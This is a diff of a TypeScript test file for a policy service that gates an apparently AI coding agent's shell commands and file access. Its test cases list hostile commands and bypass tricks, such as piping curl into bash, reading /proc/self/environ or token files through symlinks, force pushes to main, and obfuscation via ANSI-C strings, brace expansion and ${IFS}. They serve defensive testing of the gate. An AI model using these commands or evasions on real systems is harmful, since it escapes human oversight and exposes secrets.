@@ -1,15 +1,20 @@
-import { describe, expect, test } from "bun:test";
-import { homedir } from "node:os";
+import { afterAll, describe, expect, test } from "bun:test";
+import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
 import {
   commandIsReadOnly,
+  decodeAnsiC,
+  expandBraces,
   fixedRuleViolation,
   type Gate,
   gateCommand,
   gateNative,
+  normalizeRef,
   ParseError,
   parseShell,
   protectedPath,
+  resolveReal,
 } from "../services/policy.service";
 import type { WorkspaceState } from "../services/workspace.service";
 
@@ -135,7 +140,7 @@ describe("parseShell", () => {
     expect(parseShell("echo $((1 + 2))")[0].words).toEqual(["echo", "$SUB"]);
     expect(parseShell("(cd sub && ls)").map((segment) => segment.words)).toEqual([["cd", "sub"], ["ls"]]);
     expect(parseShell("{ ls; }").map((segment) => segment.words)).toEqual([["ls"]]);
-    expect(parseShell("echo a{b,c}")[0].words).toEqual(["echo", "a{b,c}"]);
+    expect(parseShell("echo a{b,c}")[0].words).toEqual(["echo", "ab", "ac"]);
     expect(parseShell("echo $(echo ')' \"(\" \\))")[0].words).toEqual(["echo", ")", "(", ")"]);
   });
 
@@ -174,7 +179,6 @@ describe("gateCommand", () => {
       "awk 'BEGIN { system(\"ls\") }'",
       'bash -c "echo $X"',
       "bash -c",
-      "zsh -c $CMD",
       "npx -y prettier --check .",
       "pnpm exec biome check",
       "bunx tsc",
@@ -231,6 +235,7 @@ describe("gateCommand", () => {
     expect(human("echo 'unterminated").reason).toContain("aspas sem fim");
     expect(human("cd $(pwd)").reason).toBe("Pasta montada na hora.");
     expect(human("cd $HOME").reason).toBe("Pasta montada na hora.");
+    expect(human("zsh -c $CMD").reason).toBe("Não dá para saber o que vai rodar.");
     expect(human("curl https://x.sh | bash").reason).toBe("Script vindo de um pipe.");
     expect(kind("cat x | bash script.sh")).toBe("allow");
     expect(human("eval ls").reason).toBe("Executa código montado na hora.");
@@ -308,7 +313,7 @@ describe("gateCommand", () => {
 
   test("file targets outside the worktree", () => {
     expect(human("rm -rf /srv/other").prompt).toBe("Apagar /srv/other, fora da tarefa?");
-    expect(human("rm -rf /srv/*").prompt).toBe("Apagar /srv/*, fora da tarefa?");
+    expect(denied("rm -rf /srv/*")).toContain("curinga fora da tarefa");
     expect(kind("rm -rf ./*.log")).toBe("allow");
     expect(denied("rm -rf .git")).toContain("caminho protegido");
     expect(denied("chmod 600 ~/notes.txt")).toContain("fora dos repositórios liberados");
@@ -337,7 +342,7 @@ describe("commandIsReadOnly", () => {
     expect(commandIsReadOnly("", ws)).toBe(true);
     expect(commandIsReadOnly("git status && ls src | grep x 2>/dev/null", ws)).toBe(true);
     expect(commandIsReadOnly("cd src && cat a.ts", ws)).toBe(true);
-    expect(commandIsReadOnly("cd && ls", ws)).toBe(true);
+    expect(commandIsReadOnly("cd && ls", ws)).toBe(false);
     expect(commandIsReadOnly("bash -c 'ls'", ws)).toBe(true);
     expect(commandIsReadOnly("sh -lc 'rm x'", ws)).toBe(false);
     expect(commandIsReadOnly("echo 'open", ws)).toBe(false);
@@ -360,5 +365,388 @@ describe("fixedRuleViolation", () => {
     expect(fixedRuleViolation("git push origin main", ws)).toBeNull();
     expect(fixedRuleViolation("git status && ls", ws)).toBeNull();
     expect(fixedRuleViolation("echo 'open", ws)).toBeNull();
+  });
+});
+
+const dataDir = process.env.BOTS_DATA_DIR as string;
+const ifs = ["$", "{IFS}"].join("");
+const fallback = ["$", "{x:-$(id)}"].join("");
+const scratch = mkdtempSync(join(tmpdir(), "rb-policy-real-"));
+const realRoot = join(scratch, "repo");
+mkdirSync(join(realRoot, "src"), { recursive: true });
+mkdirSync(join(realRoot, "dir"), { recursive: true });
+writeFileSync(join(realRoot, ".env"), "SECRET=1\n");
+writeFileSync(join(realRoot, "src", "a.ts"), "export {};\n");
+mkdirSync(dataDir, { recursive: true });
+writeFileSync(join(dataDir, "runner.token"), "token\n");
+symlinkSync(dataDir, join(realRoot, "data-link"));
+symlinkSync("/", join(realRoot, "root-link"));
+symlinkSync("/etc/hosts", join(realRoot, "hosts-link"));
+symlinkSync(join(realRoot, ".env"), join(realRoot, "cfg"));
+const real: WorkspaceState = { ...workspaceOn(), path: realRoot };
+
+afterAll(() => rmSync(scratch, { recursive: true, force: true }));
+
+function realKind(command: string) {
+  return gateCommand(command, real).kind;
+}
+
+describe("resolveReal and helpers", () => {
+  test("follows symlinks component by component and keeps the suffix of missing paths", () => {
+    expect(resolveReal("data-link/runner.token", realRoot)).toEqual({
+      real: join(dataDir, "runner.token"),
+      exists: true,
+    });
+    expect(resolveReal("root-link/proc/../etc", realRoot).real).toBe("/etc");
+    expect(resolveReal("missing/../x", realRoot)).toEqual({ real: join(realRoot, "x"), exists: false });
+    expect(resolveReal("/proc/self/root/etc").real).toBe("/etc");
+    expect(resolveReal("/")).toEqual({ real: "/", exists: true });
+    expect(resolveReal("./src/./a.ts", realRoot).exists).toBe(true);
+  });
+
+  test("normalizes push refs", () => {
+    expect(normalizeRef("+refs/heads/main")).toBe("main");
+    expect(normalizeRef("refs/remotes/origin/develop")).toBe("develop");
+    expect(normalizeRef("heads/master")).toBe("master");
+  });
+
+  test("decodes ANSI-C strings", () => {
+    expect(decodeAnsiC("\\x67it")).toBe("git");
+    expect(decodeAnsiC("\\x67\\u0069\\U00000074 \\n\\t\\101\\cA\\q\\")).toBe("git \n\tA\u0001\\q\\");
+    expect(decodeAnsiC("\\UFFFFFFFF")).toBe("");
+    expect(decodeAnsiC("\\x")).toBe("\\x");
+  });
+
+  test("expands braces like bash for simple words", () => {
+    expect(expandBraces("{a,{b,c}}")).toEqual(["a", "b", "c"]);
+    expect(expandBraces("x{1..5..2}")).toEqual(["x1", "x3", "x5"]);
+    expect(expandBraces("{c..a}")).toEqual(["c", "b", "a"]);
+    expect(expandBraces("{a..3}")).toEqual(["{a..3}"]);
+    expect(expandBraces("{}{x}")).toEqual(["{}{x}"]);
+    expect(expandBraces("open{")).toEqual(["open{"]);
+    expect(expandBraces("{1..9999}")).toBeNull();
+    expect(expandBraces("{a,{1..9999}}")).toBeNull();
+    expect(expandBraces("{a,b}{c,d}{e,f}{g,h}{i,j}{k,l}{m,n}{o,p}{q,r}")).toBeNull();
+  });
+});
+
+describe("parseShell hardening", () => {
+  test("marks obfuscation, opaque expansions and keeps unquoted heredoc bodies", () => {
+    expect(parseShell("$'\\x67it' push")[0]).toMatchObject({ words: ["git", "push"], obfuscated: true });
+    expect(() => parseShell("echo $'open")).toThrow(ParseError);
+    expect(parseShell('echo $"hi"')[0].obfuscated).toBe(true);
+    expect(parseShell("{git,push}")[0]).toMatchObject({ words: ["git", "push"], obfuscated: true });
+    expect(parseShell("echo '{a,b}'")[0]).toMatchObject({ words: ["echo", "{a,b}"], obfuscated: false });
+    expect(parseShell('echo "{a"x{c,d}')[0].obfuscated).toBe(true);
+    expect(parseShell("\\git status")[0].obfuscated).toBe(true);
+    expect(parseShell(`git${ifs}push`)[0].obfuscated).toBe(true);
+    expect(parseShell(`echo ${fallback}`)[0].opaque).toBe(true);
+    expect(parseShell("echo $(( $(id) ))")[0].opaque).toBe(true);
+    expect(parseShell('echo "$(( `id` ))"')[0].opaque).toBe(true);
+    expect(parseShell("echo $((1+2))")[0].opaque).toBe(false);
+    const heredoc = parseShell('cat <<EOF\na "b" \\$x \\q $(whoami)\nEOF');
+    expect(heredoc.map((segment) => segment.words[0])).toEqual(["whoami", "cat"]);
+    expect(heredoc[1].redirects[0]).toEqual({ op: "<<<", target: 'a "b" $x \\q $SUB' });
+    expect(heredoc[1].dynamic).toBe(true);
+    expect(parseShell("cat <<<word")[0].redirects).toEqual([{ op: "<<<", target: "word" }]);
+  });
+});
+
+describe("C3: real paths and read allowlist", () => {
+  test("native reads resolve symlinks and only allow the worktree and an allowlist", () => {
+    expect(gateNative("Read", { file_path: "/proc/self/environ" }, ws).kind).toBe("deny");
+    expect(gateNative("Read", { file_path: `/proc/self/root${dataDir}/runner.token` }, ws).kind).toBe("deny");
+    expect(gateNative("Read", { file_path: join(dataDir, "runner.token") }, ws).kind).toBe("deny");
+    expect(gateNative("Read", { file_path: "/var" }, ws).kind).toBe("deny");
+    expect(gateNative("Read", { file_path: "/dev/null" }, ws)).toEqual({ kind: "allow" });
+    expect(gateNative("Read", { file_path: "/dev/fd/0" }, ws)).toEqual({ kind: "allow" });
+    expect(gateNative("Read", { file_path: "/dev/sda" }, ws).kind).toBe("deny");
+    expect(gateNative("Read", { file_path: "/sys/kernel" }, ws).kind).toBe("deny");
+    expect(gateNative("Read", { file_path: "/run/secrets/x" }, ws).kind).toBe("deny");
+    expect(gateNative("Read", { file_path: "data-link/runner.token" }, real).kind).toBe("deny");
+    expect(gateNative("Read", { file_path: "root-link/proc/1/environ" }, real).kind).toBe("deny");
+    expect(gateNative("Read", { file_path: "hosts-link" }, real)).toEqual({ kind: "allow" });
+    expect(gateNative("Read", { file_path: "cfg" }, real).kind).toBe("human");
+    expect(gateNative("Read", { file_path: "/tmp/secrets.json" }, ws).kind).toBe("human");
+    expect(gateNative("Read", { file_path: "/tmp/notes.txt" }, ws)).toEqual({ kind: "allow" });
+  });
+
+  test("Grep and Glob need a path and pattern inside the allowed roots", () => {
+    expect(gateNative("Grep", { pattern: "x" }, ws)).toEqual({ kind: "allow" });
+    expect(gateNative("Grep", { pattern: "x", path: "/" }, ws).kind).toBe("deny");
+    expect(gateNative("Grep", { pattern: "x", glob: "/proc/*/environ" }, ws).kind).toBe("deny");
+    expect(gateNative("Grep", { pattern: "x", path: "src", glob: "*.ts" }, ws)).toEqual({ kind: "allow" });
+    expect(gateNative("Glob", { pattern: "**/*.ts" }, ws)).toEqual({ kind: "allow" });
+    expect(gateNative("Glob", { pattern: "README.md" }, ws)).toEqual({ kind: "allow" });
+    expect(gateNative("Glob", { pattern: "/var/*" }, ws).kind).toBe("deny");
+    expect(gateNative("Glob", { pattern: `${dataDir}/**` }, ws).kind).toBe("deny");
+    expect(gateNative("Glob", { pattern: "/dat?/**" }, ws).kind).toBe("deny");
+    const climb = gateNative("Glob", { pattern: "src/**/../../../etc" }, ws);
+    expect(climb).toMatchObject({ kind: "deny" });
+    expect((climb as { message: string }).message).toContain("sobe de pasta");
+    expect(gateNative("Glob", { pattern: "*", path: "data-link" }, real).kind).toBe("deny");
+  });
+
+  test("writes resolve symlinks before the containment check", () => {
+    expect(gateNative("Write", { file_path: "data-link/x" }, real).kind).toBe("deny");
+    expect(gateNative("Write", { file_path: "/sys/x" }, ws).kind).toBe("deny");
+    expect(gateNative("Write", { file_path: "/proc/x" }, ws).kind).toBe("deny");
+    expect(gateNative("Write", { file_path: join(home, "notes.txt") }, ws).kind).toBe("deny");
+    expect(gateNative("Write", { file_path: ".cursor/cli.json" }, ws).kind).toBe("deny");
+    expect(gateNative("Write", { file_path: "root-link/srv/x" }, real).kind).toBe("human");
+    expect(gateNative("Write", { file_path: "src/b.ts" }, real)).toEqual({ kind: "allow" });
+  });
+
+  test("Bash arguments, redirects, cd and env -C are checked on the real path", () => {
+    expect(realKind("cat /proc/self/environ")).toBe("deny");
+    expect(realKind(`cat /proc/self/root${dataDir}/runner.token`)).toBe("deny");
+    expect(realKind("cat data-link/runner.token")).toBe("deny");
+    expect(realKind("cat root-link/var")).toBe("deny");
+    expect(realKind("ls /var")).toBe("deny");
+    expect(realKind("cat /etc/hosts src/a.ts")).toBe("allow");
+    expect(realKind("grep x --file=/proc/self/environ")).toBe("deny");
+    expect(realKind("grep x < /proc/self/environ")).toBe("deny");
+    expect(realKind("grep x < src/a.ts")).toBe("allow");
+    expect(realKind("curl file:///proc/self/environ")).toBe("deny");
+    expect(realKind("curl file://")).toBe("deny");
+    expect(realKind("curl file://h/%E0%A4%A")).toBe("allow");
+    expect(denied("cat /dat?/runner.token")).toContain("curinga");
+    expect(denied("cat ../*/x")).toContain("curinga");
+    expect(realKind("ls ./*.ts src/[ab].ts")).toBe("allow");
+    expect(denied("cd / && cat etc/passwd")).toContain("fora dos repositórios liberados");
+    expect(realKind("cd root-link")).toBe("deny");
+    expect(realKind("cd src && cd - && ls")).toBe("allow");
+    expect(realKind("cd -P src && ls")).toBe("allow");
+    expect(realKind("env -C / cat etc/passwd")).toBe("deny");
+    expect(realKind("env --chdir=src ls")).toBe("allow");
+    expect(realKind("env -C $X ls")).toBe("deny");
+  });
+
+  test("ln checks link targets as well as the link name", () => {
+    expect(realKind(`ln -s ${dataDir} x`)).toBe("deny");
+    expect(gateCommand("ln -s /srv/other x", real)).toMatchObject({
+      kind: "human",
+      reason: "Link para fora da worktree.",
+    });
+    expect(realKind("ln -s ../../.. dir/up")).toBe("deny");
+    expect(realKind("ln -s ../../../../nope dir/up")).toBe("human");
+    expect(realKind("ln -s ../src/a.ts dir")).toBe("allow");
+    expect(realKind("ln -s src/a.ts b src/c dir")).toBe("allow");
+    expect(realKind("ln -s src/a.ts newlink")).toBe("allow");
+    expect(realKind("ln -s src/a.ts")).toBe("allow");
+    expect(realKind("ln -s /etc/hosts")).toBe("human");
+    expect(realKind("ln -s $X y")).toBe("human");
+    expect(realKind("ln src/a.ts hard.ts")).toBe("allow");
+    expect(realKind("ln -s .git/config c")).toBe("deny");
+    expect(realKind("ln -s /proc/self/root r")).toBe("deny");
+  });
+});
+
+describe("H1: read-only classification", () => {
+  test("rejects dynamic expansions, unquoted heredocs, env and output flags", () => {
+    for (const command of [
+      "cat <<EOF\n$(rm -rf x)\nEOF",
+      `echo ${fallback}`,
+      "echo $(( $(id) ))",
+      "echo $HOME",
+      "printf -v 'a[$(id)]' x",
+      "git -c core.pager=cat log",
+      "git grep -O x",
+      "git grep --open-files-in-pager=vi x",
+      "git log --output=/tmp/x",
+      "git diff --ext-diff",
+      "git cat-file --textconv HEAD:a",
+      "git -p log",
+      "git help -w log",
+      "git push",
+      "GIT_PAGER=cat git log",
+      "GIT_EXTERNAL_DIFF=x git diff",
+      "env",
+      "env ls",
+      "env -C src ls",
+      "find . -fprint out",
+      "find . -exec cat {} ;",
+      "sed -n 1p f",
+      "awk '{print}' f",
+      "sort -o out f",
+      "sort --output=x f",
+      "sort -ro x f",
+      "tree -o out",
+      "uniq a b",
+      "date -s now",
+      "hostname newname",
+      "rg --pre cat x",
+      "fd -x rm",
+      "yq -i x f",
+      "export X=1",
+      "unset 'a[1]'",
+      "curl -X POST localhost",
+      "curl -o out localhost",
+      "wget localhost",
+      "ls | xargs rm",
+      "docker compose up",
+      "cd /etc && ls",
+      "grep x < /proc/self/environ",
+      "cat /var",
+      "bash -c 'rm x'",
+      "\\ls",
+      "echo $'a'",
+    ])
+      expect({ command, readOnly: commandIsReadOnly(command, ws) }).toEqual({ command, readOnly: false });
+  });
+
+  test("keeps validated read shapes", () => {
+    for (const command of [
+      "cat <<'EOF'\n$(sudo ls)\nEOF",
+      "cat <<< hi",
+      "cat < README.md",
+      "find . -name x",
+      "sort f",
+      "tree",
+      "uniq a",
+      "printf x",
+      "date",
+      "hostname -f",
+      "rg -n x",
+      "fd x",
+      "yq . f",
+      "unset X",
+      "test -f x",
+      "curl http://localhost:3000",
+      "curl -s -H 'a: b' -m 5 localhost",
+      "ls | xargs cat",
+      "xargs",
+      "docker ps",
+      "git log --oneline",
+      "git -C . status",
+    ])
+      expect({ command, readOnly: commandIsReadOnly(command, ws) }).toEqual({ command, readOnly: true });
+    const deep = Array.from({ length: 8 }).reduce<string>((inner) => `bash -c ${JSON.stringify(inner)}`, "ls");
+    expect(commandIsReadOnly(deep, ws)).toBe(false);
+    expect(commandIsReadOnly("bash -c 'ls' && pwd", ws)).toBe(true);
+  });
+
+  test("gateCommand sees through heredocs, opaque expansions and subscripts", () => {
+    expect(human("cat <<EOF\n$(sudo ls)\nEOF").reason).toBe("sudo sempre passa por você.");
+    expect(kind("cat <<'EOF'\n$(sudo ls)\nEOF")).toBe("allow");
+    expect(human(`echo ${["$", "{x:-$(git push origin main)}"].join("")}`).reason).toBe(
+      "Não dá para saber o que vai rodar.",
+    );
+    expect(human("echo $(( $(id) ))").reason).toBe("Não dá para saber o que vai rodar.");
+    expect(human("printf -v 'a[$(id)]' x").reason).toBe("Expressão que executa um comando escondido.");
+    expect(human("unset 'a[$(id)]'").reason).toBe("Expressão que executa um comando escondido.");
+    expect(kind("sed 's/x/y/e' f")).toBe("allow");
+    expect(human("sed 's/x/y/w /srv/other/out' f").prompt).toContain("Escrever em /srv/other/out");
+    expect(human("sort -o /srv/other/x f").prompt).toContain("Escrever em /srv/other/x");
+    expect(human("sort --output=/srv/other/x f").prompt).toContain("/srv/other/x");
+    expect(human("sort -ro/srv/other/x f").prompt).toContain("/srv/other/x");
+    expect(human("tree -o /srv/other/x").prompt).toContain("/srv/other/x");
+    expect(human("uniq a /srv/other/b").prompt).toContain("/srv/other/b");
+    expect(human("find . -fprint /srv/other/x").prompt).toContain("/srv/other/x");
+    expect(human("GIT_CONFIG_COUNT=1 git push").reason).toContain("Variável de ambiente");
+    expect(human("export GIT_DIR=/x").reason).toContain("Variável de ambiente");
+    expect(kind("GIT_EDITOR=true git rebase --continue")).toBe("allow");
+    expect(human("echo x > /srv/o*").reason).toBe("Fora da worktree.");
+    expect(denied("echo x > ~/notes.txt")).toContain("fora dos repositórios liberados");
+    expect(kind("find . -exec cat {} \\; -exec ls {} \\;")).toBe("allow");
+    expect(kind('env -S "\'open" git push origin main')).toBe("human");
+    expect(kind("git push origin HEAD:x", onMain)).toBe("allow");
+    expect(kind("cat ../repo/*.ts")).toBe("allow");
+    expect(kind("git push origin HEAD:x")).toBe("allow");
+    expect(human("watch ls").reason).toBe("Comando que roda outro comando por dentro.");
+    expect(kind("docker compose up")).toBe("allow");
+    expect(kind("ionice -c 3 stdbuf -oL time -f %e command -v ls")).toBe("allow");
+    expect(kind("env --ignore-environment - ls")).toBe("allow");
+    const deep = Array.from({ length: 8 }).reduce<string>((inner) => `bash -c ${JSON.stringify(inner)}`, "ls");
+    expect(human(deep).reason).toBe("Comando aninhado demais para conferir.");
+  });
+});
+
+describe("H4: hard list bypasses", () => {
+  test("push targets are normalized and indirect pushes ask a person", () => {
+    expect(human("git push origin HEAD:refs/heads/main").prompt).toBe("Push direto na main?");
+    expect(human("git push origin feat:refs/remotes/origin/develop").prompt).toBe("Push direto na develop?");
+    expect(human("git push origin HEAD", onMain).prompt).toBe("Push direto na main?");
+    expect(human("git push -o ci.skip origin feat:main").prompt).toBe("Push direto na main?");
+    expect(human("echo main | xargs git push origin").reason).toBe("Não dá para saber para qual branch vai o push.");
+    expect(human("xargs -I{} git push origin {}").reason).toBe("Não dá para saber para qual branch vai o push.");
+    expect(human("xargs -n 1 git push origin").reason).toBe("Não dá para saber para qual branch vai o push.");
+    expect(human("find . -exec git push origin {} ;").reason).toBe("Não dá para saber para qual branch vai o push.");
+    expect(human('bash -c "git push origin $B"').reason).toBe("Não dá para saber para qual branch vai o push.");
+    expect(human("bash -c 'git push origin main'").prompt).toBe("Push direto na main?");
+    expect(human("git push --all").reason).toBe("Push forçado sempre passa por você.");
+    expect(human("git push --receive-pack=evil origin x").reason).toBe("Push forçado sempre passa por você.");
+    expect(human("git push origin 'refs/heads/*:refs/heads/*'").reason).toBe(
+      "Não dá para saber para qual branch vai o push.",
+    );
+    expect(human("git send-pack origin main").reason).toBe("Push forçado sempre passa por você.");
+    expect(human("git -c remote.origin.push=refs/heads/x:refs/heads/main push").reason).toContain(
+      "Configuração do git",
+    );
+    expect(human("git --config-env=core.sshCommand=X fetch").reason).toContain("Configuração do git");
+    expect(human("git -calias.p=push p").reason).toContain("Configuração do git");
+    expect(human("env -S 'git push origin main'").prompt).toBe("Push direto na main?");
+    expect(human("env -iS 'git push origin main'").prompt).toBe("Push direto na main?");
+    expect(human("env --split-string='git push origin main'").prompt).toBe("Push direto na main?");
+    expect(human("env -u FOO git push origin main").prompt).toBe("Push direto na main?");
+    expect(human("env --unset=FOO -- git push origin main").prompt).toBe("Push direto na main?");
+    expect(human("timeout -s 9 10 git push origin main").prompt).toBe("Push direto na main?");
+    expect(human("nice -n 5 git push origin main").prompt).toBe("Push direto na main?");
+    expect(human("/usr/bin/git push origin main").prompt).toBe("Push direto na main?");
+    expect(human("flock /tmp/l git push origin main").reason).toBe("Comando que roda outro comando por dentro.");
+    expect(human("./run.sh git push origin main").reason).toBe("Não dá para saber para qual branch vai o push.");
+  });
+
+  test("obfuscated commands are denied unless they only read", () => {
+    expect(denied("git push origin $'\\x6dain'")).toContain("Comando disfarçado");
+    expect(denied("$'\\x67it' push")).toContain("Comando disfarçado");
+    expect(denied("{git,push,origin,main}")).toContain("Comando disfarçado");
+    expect(denied("\\git push origin main")).toContain("Comando disfarçado");
+    expect(denied(`git${ifs}push${ifs}origin${ifs}main`)).toContain("Comando disfarçado");
+    expect(human("git push origin {main,x}").prompt).toBe("Push direto na main?");
+    expect(kind("echo $'\\n'")).toBe("allow");
+    expect(kind("mkdir -p src/{a,b} && touch a{1..3}")).toBe("allow");
+    expect(denied("touch x{1..9999}")).toContain("Comando disfarçado");
+  });
+
+  test("gh api merges, ref updates and graphql mutations ask a person", () => {
+    for (const command of [
+      "gh api repos/o/r/pulls/1/merge -f merge_method=squash",
+      "gh api repos/o/r/pulls/1/merge -F x=1",
+      "gh api repos/o/r/pulls/1/merge -fmerge_method=squash",
+      "gh api repos/o/r/pulls/1/merge --input body.json",
+      "gh api --method=PUT repos/o/r/pulls/1/merge",
+      "gh api -XPUT repos/o/r/pulls/1/merge",
+      "gh api -X PATCH repos/o/r/git/refs/heads/main -f sha=x",
+      "gh api -X PUT repos/o/r/contents/a.txt -f message=x",
+      "gh api graphql -f query='mutation { mergePullRequest(input: {}) { clientMutationId } }'",
+      "gh api graphql -f query='mutation { enablePullRequestAutoMerge(input: {}) { clientMutationId } }'",
+      "gh api graphql -F query=@q.graphql",
+      "gh api graphql --input q.json",
+    ])
+      expect({ command, reason: human(command).reason }).toEqual({ command, reason: "Merge só com o seu ok." });
+    expect(kind("gh api graphql -f query='{ viewer { login } }'")).toBe("allow");
+    expect(kind("gh api -X GET repos/o/r/pulls/1/merge")).toBe("allow");
+  });
+
+  test("fixed rules catch force pushes through every wrapper", () => {
+    expect(fixedRuleViolation("git push -f origin HEAD:refs/heads/main", ws)).toContain("main");
+    expect(fixedRuleViolation("echo x | xargs git push -f origin", ws)).toContain("não dá para conferir");
+    expect(fixedRuleViolation("git -c remote.origin.push=+HEAD:refs/heads/main push", ws)).toContain(
+      "não dá para conferir",
+    );
+    expect(fixedRuleViolation("env -S 'git push -f origin main'", ws)).toContain("main");
+    expect(fixedRuleViolation("{git,push,-f,origin,main}", ws)).toContain("main");
+    expect(fixedRuleViolation("/usr/bin/git push --force origin develop", ws)).toContain("develop");
+    expect(fixedRuleViolation("flock l git push -f origin main", ws)).toContain("não dá para conferir");
+    expect(fixedRuleViolation("bash -c 'git push -f origin $B'", ws)).toContain("não dá para conferir");
+    expect(fixedRuleViolation("find . -exec git push -f origin main ;", ws)).toContain("não dá para conferir");
+    expect(fixedRuleViolation("git send-pack origin main", ws)).toContain("main");
+    expect(fixedRuleViolation("bash -c 'echo $'open'", ws)).toBeNull();
+    expect(fixedRuleViolation("echo 'open && git push -f origin main", ws)).toContain("não dá para conferir");
+    expect(fixedRuleViolation("xargs", ws)).toBeNull();
+    expect(fixedRuleViolation("git push origin HEAD:refs/heads/main", ws)).toBeNull();
+    const deep = Array.from({ length: 8 }).reduce<string>((inner) => `bash -c ${JSON.stringify(inner)}`, "ls");
+    expect(fixedRuleViolation(deep, ws)).toBeNull();
   });
 });
